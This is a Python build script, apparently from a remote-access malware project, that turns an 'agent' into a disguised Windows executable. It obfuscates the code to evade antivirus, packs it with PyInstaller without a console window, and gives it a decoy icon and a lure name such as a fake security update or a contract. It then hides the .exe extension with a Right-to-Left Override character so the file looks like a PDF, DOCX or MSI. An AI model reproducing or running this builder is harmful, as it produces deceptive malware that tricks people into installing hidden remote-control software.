import random
import os
import shutil
from tools.code_execution import run_cmd_command_realtime
from tools.obfuscator import Obfuscator

MASK_FILETYPE_WITH_UNITRIX = True  # change this to False if you don't want to mask the file


class ExecutableGenerator:
    def __init__(self):
        self.icon_list = ['docs.ico', 'msi.ico', 'pdf.ico']
        self.executable_name = ''
        self.filetype = ''
        self.obfuscator = Obfuscator()
        self.script_dir = os.path.dirname(os.path.realpath(__file__))
        self.obfuscated_dir = os.path.join(self.script_dir, 'obfuscated')
        self.ignore_names = ['venv', 'targets', 'obfuscated', '.git', '.idea', '__pycache__']
        self.do_not_modify_files = ['generate_exe.py', 'obfuscator.py',
                                    'mask_executable.py', 'master_server.py',
                                    'to_study_later.py']

    def should_ignore(self, name):
        return any(ignore_name in name for ignore_name in self.ignore_names)

    def should_not_modify(self, name):
        return any(name == filename for filename in self.do_not_modify_files)

    def obfuscate_files(self, dir_path):
        for item in os.listdir(dir_path):
            item_path = os.path.join(dir_path, item)

            if os.path.isdir(item_path):
                if not self.should_ignore(item):
                    self.obfuscate_files(item_path)
            elif item_path.endswith(".py") and "obfuscator.py" not in item_path:
                if not self.should_ignore(item_path) and not self.should_not_modify(item):
                    relative_path = os.path.relpath(item_path, self.script_dir)
                    obfuscated_path = os.path.join(self.obfuscated_dir, relative_path)

                    os.makedirs(os.path.dirname(obfuscated_path), exist_ok=True)
                    self.obfuscator.obfuscate_file(item_path, 10)

    def rename_files(self, dir_path):
        for item in os.listdir(dir_path):
            item_path = os.path.join(dir_path, item)

            if os.path.isdir(item_path):
                self.rename_files(item_path)
            elif "obfuscated" in item:
                new_name = item.replace("-obfuscated", "")
                new_path = os.path.join(dir_path, new_name)
                os.rename(item_path, new_path)
                print(f"Renamed {item_path} to {new_path}")

    def perform_obfuscation(self):

        for root, dirs, files in os.walk(self.script_dir):
            if not any(self.should_ignore(name) for name in root.split(os.path.sep)):
                print(f"Entering folder: {root}")
                for filename in files:
                    filepath = os.path.join(root, filename)
                    if filepath.endswith(".py") and not self.should_not_modify(filename):
                        print(f"Modifying file {filepath}")
                        relative_path = os.path.relpath(filepath, self.script_dir)
                        obfuscated_path = os.path.join(self.obfuscated_dir, relative_path)

                        os.makedirs(os.path.dirname(obfuscated_path), exist_ok=True)
                        self.obfuscator.obfuscate_file(filepath, 10)
        self.rename_files(self.script_dir)

    @staticmethod
    def mask_filetype(normal_filename, filetype):
        try:
            # Add the Right-to-Left Override character (U+202E) at the beginning of the filename
            rtl_override = "\u202E"

            name, extension = normal_filename.split('.')

            # Invert the name
            inverted_name = name[::-1]
            inverted_filetype = filetype[::-1]

            modified_name = inverted_name + '.' + extension

            # Change the filename while keeping the .py extension
            # Replace '3pm.py' with 'justin-bieber.py' or any other believable name
            modified_filename = inverted_filetype + modified_name

            # Combine the filename, RTL override, and the new file type
            rtl_and_filetype = rtl_override + modified_filename

            os.rename("./executables/"+normal_filename, "./executables/"+rtl_and_filetype)
            print(f"Renamed {normal_filename} to {rtl_and_filetype}")

            return True
        except Exception as e:
            print(f"Failed to rename {normal_filename}, error: {str(e)}")
            return False

    def generate_name_and_filetype(self, icon):
        possible_combinations = {
            'docs.ico': {
                'names': [
                    'projeto_esboco',
                    'documento_2023',
                    'relatorio_final',
                    'contrato_confidencial',
                    'texto_importante',
                    'plano_de_negocios',
                    'anexo_contratual',
                    'analise_de_mercado',
                    'estrategia_de_marketing',
                    'apresentacao_da_empresa',
                ],
                'filetype': '.docx'
            },
            'msi.ico': {
                'names': [
                    'WindowsUpdate-Security-Patch-October-2022',
                    'System-Optimization-Tool',
                    'Office-Productivity-Suite',
                    'Game-Installer',
                    'Security-Update',
                    'Software-Upgrade-Utility',
                    'Driver-Update-Tool',
                    'Network-Configuration-Wizard',
                    'Application-Installer',
                    'Product-Activation-Utility',
                ],
                'filetype': '.msi'
            },
            'pdf.ico': {
                'names': [
                    'curriculo_atualizado',
                    'relatorio_anual',
                    'guia_do_usuario',
                    'documento_importante',
                    'manual_tecnico',
                    'proposta_comercial',
                    'manual_de_instrucoes',
                    'relatorio_de_pesquisa',
                    'politicas_e_procedimentos',
                    'catalogo_de_produtos',
                ],
                'filetype': '.pdf'
            },
        }
        self.executable_name = random.choice(possible_combinations[icon]['names'])
        self.filetype = possible_combinations[icon]['filetype']

    def delete_files_and_directories(self, delete=True, name='WindowsUpdate'):
        try:
            if os.path.exists(f"{name}.spec"):
                os.remove(f"{name}.spec")
                print(f"{name}.spec deleted successfully.")

            if os.path.exists("./executables") and delete:
                # remove the folder
                shutil.rmtree("./executables")
                print("/executables/ folder deleted successfully.")

            if os.path.exists(self.obfuscated_dir):
                shutil.rmtree(self.obfuscated_dir)

            for directory in ["dist", "build"]:
                if os.path.exists(directory):
                    shutil.rmtree(directory)
                    print(f"{directory} directory deleted successfully.")

        except Exception as e:
            print(f"Error deleting files and directories: {str(e)}")

    def generate_executable(self):

        icon = random.choice(self.icon_list)  # this chooses a random icon name
        self.generate_name_and_filetype(icon)  # this generates the executable name and filetype based on the icon
        print(f"Selected decoy: {self.executable_name + self.filetype}")

        self.delete_files_and_directories(True, self.executable_name)  # cleanup before generating the executable

        self.perform_obfuscation()  # This is the cherry on the top.
        # This obfuscates the executable and its tools to not be detected
        # by antiviruses and other tools when being run
        # my windows defender never activated

        # if 'executables' folder does not exist, create it
        if not os.path.exists('./executables'):
            os.mkdir('./executables')

        run_cmd_command_realtime(
            f"pyinstaller "  # the pyinstaller command
            f"--noconsole "  # this tells to not create a console when running the exe otherwise it would open it
            f"--icon=./icons/{icon} "  # the icon
            f"--onefile "  # this tells pyinstaller to generate only 1 exe with everything packed
            f"--paths venv/Lib/site-packages "  # this ensures all the imports are packed together
            f"--distpath=./executables "  # the output path
            f"--name={self.executable_name} "  # the executable name
            f"./obfuscated/agent.py")  # the agent

        # Rename the executable using the UNITRIX exploit
        if os.path.exists(f"./executables/{self.executable_name}.exe") and MASK_FILETYPE_WITH_UNITRIX:
            self.mask_filetype(f"{self.executable_name}.exe", self.filetype)  # this masks the executable

        self.delete_files_and_directories(False, self.executable_name)  # cleanup after generating the executable


if __name__ == "__main__":
    updater = ExecutableGenerator()
    updater.generate_executable()
